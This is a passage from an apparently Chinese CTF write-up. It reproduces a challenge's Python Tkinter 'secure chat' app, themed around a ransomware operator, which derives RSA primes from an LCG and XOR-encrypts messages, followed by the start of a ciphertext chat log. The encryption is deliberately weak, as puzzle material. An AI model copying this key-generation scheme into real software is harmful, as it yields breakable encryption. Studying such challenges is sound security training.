language_">self</span>.seed_hash)</span><br><span class="line">        <span class="variable language_">self</span>.lcg_oracle = LCGOracle(m, c, n, <span class="variable language_">self</span>.seed_hash)</span><br><span class="line">        <span class="variable language_">self</span>.lcg_oracle.deploy_lcg_contract()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[SETUP] LCG Oracle is on-chain...&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.xor_oracle = TripleXOROracle()</span><br><span class="line">        <span class="variable language_">self</span>.xor_oracle.deploy_triple_xor_contract()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[SETUP] Triple XOR Oracle is on-chain...&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[SETUP] Crypto backend initialized...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_rsa_key_from_lcg</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[RSA] Generating RSA key from on-chain LCG primes...&#x27;</span>)</span><br><span class="line">        lcg_for_rsa = LCGOracle(<span class="variable language_">self</span>.lcg_oracle.multiplier, <span class="variable language_">self</span>.lcg_oracle.increment, <span class="variable language_">self</span>.lcg_oracle.modulus, <span class="variable language_">self</span>.seed_hash)</span><br><span class="line">        lcg_for_rsa.deploy_lcg_contract()</span><br><span class="line">        primes_arr = []</span><br><span class="line">        rsa_msg_count = <span class="number">0</span></span><br><span class="line">        iteration_limit = <span class="number">10000</span></span><br><span class="line">        iterations = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(primes_arr) &lt; <span class="number">8</span> <span class="keyword">and</span> iterations &lt; iteration_limit:</span><br><span class="line">            candidate = lcg_for_rsa.get_next(rsa_msg_count)</span><br><span class="line">            rsa_msg_count += <span class="number">1</span></span><br><span class="line">            iterations += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> candidate.bit_length() == <span class="number">256</span> <span class="keyword">and</span> isPrime(candidate):</span><br><span class="line">                primes_arr.append(candidate)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[RSA]  - Found 256-bit prime #<span class="subst">&#123;<span class="built_in">len</span>(primes_arr)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Primes Array: &#x27;</span>, primes_arr)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(primes_arr) &lt; <span class="number">8</span>:</span><br><span class="line">            error_msg = <span class="string">&#x27;[RSA] Error: Could not find 8 primes within iteration limit.&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Current Primes: &#x27;</span>, primes_arr)</span><br><span class="line">            <span class="built_in">print</span>(error_msg)</span><br><span class="line">            <span class="keyword">return</span> error_msg</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> p_val <span class="keyword">in</span> primes_arr:</span><br><span class="line">            n *= p_val</span><br><span class="line">        phi = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> p_val <span class="keyword">in</span> primes_arr:</span><br><span class="line">            phi *= p_val - <span class="number">1</span></span><br><span class="line">        e = <span class="number">65537</span></span><br><span class="line">        <span class="keyword">if</span> math.gcd(e, phi)!= <span class="number">1</span>:</span><br><span class="line">            error_msg = <span class="string">&#x27;[RSA] Error: Public exponent e is not coprime with phi(n). Cannot generate key.&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(error_msg)</span><br><span class="line">            <span class="keyword">return</span> error_msg</span><br><span class="line">        <span class="variable language_">self</span>.rsa_key = RSA.construct((n, e))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="variable language_">self</span>.rsa_key.export_key(<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[RSA] Public key generated and saved to \&#x27;public.pem\&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Public key generated and saved successfully.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[RSA] Error saving key: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;Error saving key: <span class="subst">&#123;e&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_message</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.conversation_start_time == <span class="number">0</span>:</span><br><span class="line">            <span class="variable language_">self</span>.conversation_start_time = time.time()</span><br><span class="line">        conversation_time = <span class="built_in">int</span>(time.time() - <span class="variable language_">self</span>.conversation_start_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.super_safe_mode <span class="keyword">and</span> <span class="variable language_">self</span>.rsa_key:</span><br><span class="line">            plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            plaintext_enc = bytes_to_long(plaintext_bytes)</span><br><span class="line">            _enc = <span class="built_in">pow</span>(plaintext_enc, <span class="variable language_">self</span>.rsa_key.e, <span class="variable language_">self</span>.rsa_key.n)</span><br><span class="line">            ciphertext = _enc.to_bytes(<span class="variable language_">self</span>.rsa_key.n.bit_length(), <span class="string">&#x27;little&#x27;</span>).rstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            encryption_mode = <span class="string">&#x27;RSA&#x27;</span></span><br><span class="line">            plaintext = <span class="string">&#x27;[ENCRYPTED]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># inserted</span></span><br><span class="line">            prime_from_lcg = <span class="variable language_">self</span>.lcg_oracle.get_next(<span class="variable language_">self</span>.message_count)</span><br><span class="line">            ciphertext = <span class="variable language_">self</span>.xor_oracle.encrypt(prime_from_lcg, conversation_time, plaintext)</span><br><span class="line">            encryption_mode = <span class="string">&#x27;LCG-XOR&#x27;</span></span><br><span class="line">        log_entry = &#123;<span class="string">&#x27;conversation_time&#x27;</span>: conversation_time, <span class="string">&#x27;mode&#x27;</span>: encryption_mode, <span class="string">&#x27;plaintext&#x27;</span>: plaintext, <span class="string">&#x27;ciphertext&#x27;</span>: ciphertext.<span class="built_in">hex</span>()&#125;</span><br><span class="line">        <span class="variable language_">self</span>.chat_history.append(log_entry)</span><br><span class="line">        <span class="variable language_">self</span>.message_count += <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.save_chat_log()</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">f&#x27;[<span class="subst">&#123;conversation_time&#125;</span>s] <span class="subst">&#123;plaintext&#125;</span>&#x27;</span>, <span class="string">f&#x27;[<span class="subst">&#123;conversation_time&#125;</span>s] <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_chat_log</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chat_log.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                json.dump(<span class="variable language_">self</span>.chat_history, f, indent=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Error saving chat log: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChatApp</span>(tk.Tk):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&#x27;Chain of Demands - Secure Chat&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&#x27;1000x800&#x27;</span>)</span><br><span class="line">        top_frame = tk.Frame(<span class="variable language_">self</span>, bd=<span class="number">5</span>)</span><br><span class="line">        top_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        chat_frame = tk.Frame(<span class="variable language_">self</span>, bd=<span class="number">5</span>)</span><br><span class="line">        chat_frame.pack(expand=<span class="literal">True</span>, fill=<span class="string">&#x27;both&#x27;</span>)</span><br><span class="line">        input_frame = tk.Frame(<span class="variable language_">self</span>, bd=<span class="number">5</span>)</span><br><span class="line">        input_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        tk.Label(top_frame, text=<span class="string">&#x27;Connect to IP:&#x27;</span>).pack(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.ip_entry = tk.Entry(top_frame, width=<span class="number">20</span>)</span><br><span class="line">        <span class="variable language_">self</span>.ip_entry.insert(<span class="number">0</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.ip_entry.pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connect_button = tk.Button(top_frame, text=<span class="string">&#x27;Connect&#x27;</span>, command=<span class="variable language_">self</span>.connect_to_peer)</span><br><span class="line">        <span class="variable language_">self</span>.connect_button.pack(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.load_files_button = tk.Button(top_frame, text=<span class="string">&#x27;Last Convo&#x27;</span>, command=<span class="variable language_">self</span>.load_last_generated_files)</span><br><span class="line">        <span class="variable language_">self</span>.load_files_button.pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line">        <span class="variable language_">self</span>.web3_config_button = tk.Button(top_frame, text=<span class="string">&#x27;Web3 Config&#x27;</span>, command=<span class="variable language_">self</span>.open_web3_config_window)</span><br><span class="line">        <span class="variable language_">self</span>.web3_config_button.pack(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.status_label = tk.Label(top_frame, text=<span class="string">&#x27;Status: Disconnected&#x27;</span>, fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.status_label.pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box = scrolledtext.ScrolledText(chat_frame, state=<span class="string">&#x27;disabled&#x27;</span>, wrap=tk.WORD, bg=<span class="string">&#x27;#f0f0f0&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.pack(expand=<span class="literal">True</span>, fill=<span class="string">&#x27;both&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.msg_entry = tk.Entry(input_frame, width=<span class="number">60</span>)</span><br><span class="line">        <span class="variable language_">self</span>.msg_entry.pack(side=<span class="string">&#x27;left&#x27;</span>, expand=<span class="literal">True</span>, fill=<span class="string">&#x27;x&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        <span class="variable language_">self</span>.msg_entry.bind(<span class="string">&#x27;&lt;Return&gt;&#x27;</span>, <span class="variable language_">self</span>.send_message_event)</span><br><span class="line">        <span class="variable language_">self</span>.msg_entry.config(state=<span class="string">&#x27;disabled&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_button = tk.Button(input_frame, text=<span class="string">&#x27;Send&#x27;</span>, command=<span class="variable language_">self</span>.send_message_event)</span><br><span class="line">        <span class="variable language_">self</span>.send_button.pack(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_button.config(state=<span class="string">&#x27;disabled&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.super_safe_var = BooleanVar()</span><br><span class="line">        <span class="variable language_">self</span>.super_safe_check = Checkbutton(top_frame, text=<span class="string">&#x27;Enable Super-Safe Encryption&#x27;</span>, variable=<span class="variable language_">self</span>.super_safe_var, command=<span class="variable language_">self</span>.toggle_super_safe)</span><br><span class="line">        <span class="variable language_">self</span>.super_safe_check.pack(side=<span class="string">&#x27;right&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line">        <span class="variable language_">self</span>.logic = ChatLogic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_web3_config_window</span>(<span class="params">self</span>):</span><br><span class="line">        config_window = Toplevel(<span class="variable language_">self</span>)</span><br><span class="line">        config_window.title(<span class="string">&#x27;Web3 Configuration&#x27;</span>)</span><br><span class="line">        config_window.geometry(<span class="string">&#x27;650x150&#x27;</span>)</span><br><span class="line">        config_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        main_frame = tk.Frame(config_window, padx=<span class="number">10</span>, pady=<span class="number">10</span>)</span><br><span class="line">        main_frame.pack(expand=<span class="literal">True</span>, fill=<span class="string">&#x27;both&#x27;</span>)</span><br><span class="line">        tk.Label(main_frame, text=<span class="string">&#x27;RPC URL:&#x27;</span>).grid(row=<span class="number">0</span>, column=<span class="number">0</span>, sticky=<span class="string">&#x27;w&#x27;</span>, pady=<span class="number">5</span>)</span><br><span class="line">        rpc_entry = tk.Entry(main_frame, width=<span class="number">60</span>)</span><br><span class="line">        rpc_entry.grid(row=<span class="number">0</span>, column=<span class="number">1</span>, sticky=<span class="string">&#x27;ew&#x27;</span>)</span><br><span class="line">        rpc_entry.insert(<span class="number">0</span>, SmartContracts.rpc_url)</span><br><span class="line">        tk.Label(main_frame, text=<span class="string">&#x27;Private Key:&#x27;</span>).grid(row=<span class="number">1</span>, column=<span class="number">0</span>, sticky=<span class="string">&#x27;w&#x27;</span>, pady=<span class="number">5</span>)</span><br><span class="line">        pk_entry = tk.Entry(main_frame, width=<span class="number">60</span>)</span><br><span class="line">        pk_entry.grid(row=<span class="number">1</span>, column=<span class="number">1</span>, sticky=<span class="string">&#x27;ew&#x27;</span>)</span><br><span class="line">        pk_entry.insert(<span class="number">0</span>, SmartContracts.private_key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">save_and_close</span>():</span><br><span class="line">            new_rpc_url = rpc_entry.get().strip()</span><br><span class="line">            new_pk = pk_entry.get().strip()</span><br><span class="line">            <span class="keyword">if</span> new_rpc_url <span class="keyword">and</span> new_pk:</span><br><span class="line">                SmartContracts.rpc_url = new_rpc_url</span><br><span class="line">                SmartContracts.private_key = new_pk</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[CONFIG] Web3 RPC URL updated to: <span class="subst">&#123;new_rpc_url&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[CONFIG] Web3 Private Key updated.&#x27;</span>)</span><br><span class="line">                messagebox.showinfo(<span class="string">&#x27;Success&#x27;</span>, <span class="string">&#x27;Web3 configuration has been updated.&#x27;</span>, parent=config_window)</span><br><span class="line">                config_window.destroy()</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># inserted</span></span><br><span class="line">                messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;Both fields are required.&#x27;</span>, parent=config_window)</span><br><span class="line">        save_button = tk.Button(main_frame, text=<span class="string">&#x27;Save &amp; Close&#x27;</span>, command=save_and_close)</span><br><span class="line">        save_button.grid(row=<span class="number">2</span>, column=<span class="number">1</span>, sticky=<span class="string">&#x27;e&#x27;</span>, pady=<span class="number">10</span>)</span><br><span class="line">        config_window.transient(<span class="variable language_">self</span>)</span><br><span class="line">        config_window.grab_set()</span><br><span class="line">        <span class="variable language_">self</span>.wait_window(config_window)</span><br><span class="line">        <span class="variable language_">self</span>.logic = ChatLogic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect_to_peer</span>(<span class="params">self</span>):</span><br><span class="line">        ip = <span class="variable language_">self</span>.ip_entry.get()</span><br><span class="line">        <span class="keyword">if</span> ip:</span><br><span class="line">            <span class="variable language_">self</span>.status_label.config(text=<span class="string">f&#x27;Status: Connected to <span class="subst">&#123;ip&#125;</span>&#x27;</span>, fg=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">&#x27;--- Welcome to Secure Chat ---&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">f&#x27;[SYSTEM] Connection to <span class="subst">&#123;ip&#125;</span> established.\n&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">&#x27;You are now talking with the ransomware operator.&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">&#x27;--------------------------------------------------\n&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.msg_entry.config(state=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_button.config(state=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display_message_in_box</span>(<span class="params">self, message, tag</span>):</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.config(state=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.insert(tk.END, message + <span class="string">&#x27;\n&#x27;</span>, tag)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.config(state=<span class="string">&#x27;disabled&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.see(tk.END)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.tag_config(<span class="string">&#x27;user&#x27;</span>, foreground=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.tag_config(<span class="string">&#x27;peer&#x27;</span>, foreground=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.tag_config(<span class="string">&#x27;system&#x27;</span>, foreground=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.chat_box.tag_config(<span class="string">&#x27;error&#x27;</span>, foreground=<span class="string">&#x27;orange&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_message_event</span>(<span class="params">self, event=<span class="literal">None</span></span>):</span><br><span class="line">        msg = <span class="variable language_">self</span>.msg_entry.get()</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">f&#x27;You: <span class="subst">&#123;msg&#125;</span>&#x27;</span>, <span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">            _, encrypted_msg_display = <span class="variable language_">self</span>.logic.process_message(msg)</span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">f&#x27;Peer (Encrypted): <span class="subst">&#123;encrypted_msg_display&#125;</span>&#x27;</span>, <span class="string">&#x27;peer&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.msg_entry.delete(<span class="number">0</span>, tk.END)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">toggle_super_safe</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.super_safe_var.get():</span><br><span class="line">            <span class="variable language_">self</span>.logic.super_safe_mode = <span class="literal">True</span></span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">&#x27;[SYSTEM] Super-Safe mode enabled. Generating RSA key...&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">            Thread(target=<span class="variable language_">self</span>.generate_rsa_and_update_gui, daemon=<span class="literal">True</span>).start()</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># inserted</span></span><br><span class="line">            <span class="variable language_">self</span>.logic.super_safe_mode = <span class="literal">False</span></span><br><span class="line">            <span class="variable language_">self</span>.display_message_in_box(<span class="string">&#x27;[SYSTEM] Super-Safe mode disabled. Reverting to standard LCG-XOR.&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_rsa_and_update_gui</span>(<span class="params">self</span>):</span><br><span class="line">        result_msg = <span class="variable language_">self</span>.logic.generate_rsa_key_from_lcg()</span><br><span class="line">        <span class="variable language_">self</span>.display_message_in_box(<span class="string">f&#x27;[SYSTEM] <span class="subst">&#123;result_msg&#125;</span>&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_last_generated_files</span>(<span class="params">self</span>):</span><br><span class="line">        files_window = Toplevel(<span class="variable language_">self</span>)</span><br><span class="line">        files_window.title(<span class="string">&#x27;Generated Files&#x27;</span>)</span><br><span class="line">        files_window.geometry(<span class="string">&#x27;700x500&#x27;</span>)</span><br><span class="line">        tk.Label(files_window, text=<span class="string">&#x27;chat_log.json&#x27;</span>, font=(<span class="string">&#x27;Helvetica&#x27;</span>, <span class="number">12</span>, <span class="string">&#x27;bold&#x27;</span>)).pack(pady=(<span class="number">10</span>, <span class="number">0</span>))</span><br><span class="line">        json_text_area = scrolledtext.ScrolledText(files_window, wrap=tk.WORD, height=<span class="number">15</span>)</span><br><span class="line">        json_text_area.pack(expand=<span class="literal">True</span>, fill=<span class="string">&#x27;both&#x27;</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json_path = resource_path(<span class="string">&#x27;chat_log.json&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(json_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                json_data = json.load(f)</span><br><span class="line">                pretty_json = json.dumps(json_data, indent=<span class="number">2</span>)</span><br><span class="line">                json_text_area.insert(tk.END, pretty_json)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            json_text_area.insert(tk.END, <span class="string">&#x27;chat_log.json not found.\n\nSend a message to generate it.&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            json_text_area.insert(tk.END, <span class="string">f&#x27;Error reading chat_log.json:\n<span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        json_text_area.config(state=<span class="string">&#x27;disabled&#x27;</span>)</span><br><span class="line">        tk.Label(files_window, text=<span class="string">&#x27;public.pem&#x27;</span>, font=(<span class="string">&#x27;Helvetica&#x27;</span>, <span class="number">12</span>, <span class="string">&#x27;bold&#x27;</span>)).pack(pady=(<span class="number">10</span>, <span class="number">0</span>))</span><br><span class="line">        pem_text_area = scrolledtext.ScrolledText(files_window, wrap=tk.WORD, height=<span class="number">8</span>)</span><br><span class="line">        pem_text_area.pack(expand=<span class="literal">True</span>, fill=<span class="string">&#x27;both&#x27;</span>, padx=<span class="number">10</span>, pady=(<span class="number">5</span>, <span class="number">10</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pem_path = resource_path(<span class="string">&#x27;public.pem&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(pem_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                pem_data = f.read()</span><br><span class="line">                pem_text_area.insert(tk.END, pem_data)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            pem_text_area.insert(tk.END, <span class="string">&#x27;public.pem not found.\n\nEnable \&#x27;Super-Safe Encryption\&#x27; to generate it.&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            pem_text_area.insert(tk.END, <span class="string">f&#x27;Error reading public.pem:\n<span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        pem_text_area.config(state=<span class="string">&#x27;disabled&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = ChatApp()</span><br><span class="line">    app.mainloop()</span><br></pre></td></tr></table></figure>

<p>是一个<font color=red><strong>伪</strong></font>区块链题目，实际上给出了对话日志和RSA公钥：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;e934b27119f12318fe16e8cd1c1678fd3b0a752eca163a7261a7e2510184bbe9&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;How are you?&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;25bf2fd1198392f4935dcace7d747c1e0715865b21358418e67f94163513eae4&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">11</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Terrible...&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c9f20e5561acf172305cf8f04c13e643c988aa5ab29b5499c93df112687c8c7c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">13</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Is this a secure channel?&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3ab9c9f38e4f767a13b12569cdbf13db6bbb939e4c8a57287fb0c9def0288e46&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;conversation_time&quot;</span><span class="punctuation">:</span> <span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LCG-XOR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plaintext&quot;</span><span 